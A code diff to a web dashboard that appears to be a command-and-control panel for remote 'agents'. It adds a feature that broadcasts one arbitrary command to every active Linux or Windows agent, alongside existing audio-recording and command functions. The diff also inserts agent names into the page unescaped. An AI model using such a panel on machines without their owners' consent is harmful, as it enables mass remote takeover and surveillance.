@@ -552,6 +552,57 @@
             text-decoration: underline;
             cursor: pointer;
         }
+
+        /* Multicast Section Styles */
+        .multicast-section {
+            background-color: #1a1a1a;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #00ff88;
+            border-radius: 5px;
+        }
+
+        .multicast-section h3 {
+            margin-bottom: 10px;
+        }
+
+        .multicast-section input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #121212;
+            border: 1px solid #00ff88;
+            color: #00ff88;
+            border-radius: 5px;
+        }
+
+        .multicast-section button {
+            background-color: #00ff88;
+            color: #121212;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .multicast-section button:hover {
+            background-color: #00cc70;
+        }
+
+        .multicast-section ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            max-height: 150px;
+            overflow-y: auto;
+            margin-bottom: 10px;
+        }
+
+        .multicast-section li {
+            padding: 5px 0;
+        }
     </style>
 </head>
 
@@ -621,12 +672,19 @@
 
                 <!-- Commands -->
                 <div id="commands" style="display:none;">
-                    <h2>Send Command</h2>
-                    <form class="command-form">
-                        <input type="text" placeholder="Agent ID">
-                        <input type="text" placeholder="Command">
-                        <button type="submit">Send</button>
-                    </form>
+                    <h2>Send Command Multicast</h2>
+                    <div class="multicast-section">
+                        <h3>Linux Agents</h3>
+                        <div id="linuxAgentsList"></div>
+                        <input type="text" id="linuxCommandInput" placeholder="Command for Linux agents">
+                        <button onclick="sendMulticastCommand('Linux')">Send to Linux Agents</button>
+                    </div>
+                    <div class="multicast-section">
+                        <h3>Windows Agents</h3>
+                        <div id="windowsAgentsList"></div>
+                        <input type="text" id="windowsCommandInput" placeholder="Command for Windows agents">
+                        <button onclick="sendMulticastCommand('Windows')">Send to Windows Agents</button>
+                    </div>
                 </div>
 
                 <!-- Status -->
@@ -771,13 +829,11 @@
             secure: true // Ensure secure connection
         });
 
-        // Uncomment the above line and set up your WebSocket connection if not already done
-
         socket.on('all_client_list', (data) => {
-            console.log('Received all_client_list:', data); // Add this
+            console.log('Received all_client_list:', data);
             if (data.type === 'full_update') {
                 clientsData = data.clients;
-                console.log("aaaaaaaaaaa", clientsData)
+                console.log("aaaaaaaaaaa", clientsData);
                 updateClientTable(data.clients);
                 populateClientIdDropdown(data.clients);
             }
@@ -786,6 +842,10 @@
         socket.on('client_activity', (data) => {
             const clientId = data.client_id;
             const newLastActive = data.last_active || new Date().toISOString();
+            const client = clientsData.find(c => c.client_id === clientId);
+            if (client) {
+                client.last_active = newLastActive;
+            }
             const row = document.getElementById(`client-${clientId}`);
             if (row) {
                 const lastActiveSpan = row.querySelector('.last-active');
@@ -874,7 +934,30 @@
             });
         }
 
-        setInterval(updateLastActiveTimers, 1000);
+        function updateMulticastAgentLists() {
+            const now = new Date();
+            const linuxAgents = clientsData.filter(client => client.os.toLowerCase().includes('linux') && (now - new Date(client.last_active)) / 1000 <= 9);
+            const windowsAgents = clientsData.filter(client => client.os.toLowerCase().includes('windows') && (now - new Date(client.last_active)) / 1000 <= 9);
+
+            const linuxList = document.getElementById('linuxAgentsList');
+            if (linuxAgents.length === 0) {
+                linuxList.innerHTML = '<p>No active Linux agents</p>';
+            } else {
+                linuxList.innerHTML = '<ul>' + linuxAgents.map(agent => `<li>${agent.client_id} - ${agent.nickname}</li>`).join('') + '</ul>';
+            }
+
+            const windowsList = document.getElementById('windowsAgentsList');
+            if (windowsAgents.length === 0) {
+                windowsList.innerHTML = '<p>No active Windows agents</p>';
+            } else {
+                windowsList.innerHTML = '<ul>' + windowsAgents.map(agent => `<li>${agent.client_id} - ${agent.nickname}</li>`).join('') + '</ul>';
+            }
+        }
+
+        setInterval(() => {
+            updateLastActiveTimers();
+            updateMulticastAgentLists();
+        }, 1000);
 
         function showSection(section) {
             const sections = ['agents', 'logs', 'commands', 'status'];
@@ -1050,7 +1133,6 @@
             }
         }
 
-
         function showAgentInfo() {
             const agentInfoDetails = document.getElementById('agentInfoDetails');
             const client = clientsData.find(c => c.client_id === currentClientId);
@@ -1187,7 +1269,6 @@
                     alert("Failed to send the command. Please try again.");
                     console.error('Error:', error);
                 });
-
         }
 
         function recordAudio() {
@@ -1207,6 +1288,37 @@
             logEntry.className = 'log-entry';
             logEntry.textContent = `[INFO] ${message} - ${new Date().toLocaleTimeString()}`;
             logsDiv.insertBefore(logEntry, logsDiv.firstChild);
+        }
+
+        function sendMulticastCommand(platform) {
+            const commandInput = platform === 'Linux' ? document.getElementById('linuxCommandInput') : document.getElementById('windowsCommandInput');
+            const command = commandInput.value.trim();
+            if (!command) {
+                alert('Please enter a command.');
+                return;
+            }
+
+            fetch('/api/command-multicast', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ platform: platform, command: command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert(`Command sent to all ${platform} agents successfully!`);
+                    logAction(`Sent command "${command}" to all ${platform} agents`);
+                    commandInput.value = '';
+                } else {
+                    alert('Failed to send command: ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending command:', error);
+                alert('An error occurred while sending the command.');
+            });
         }
     </script>
 </body>
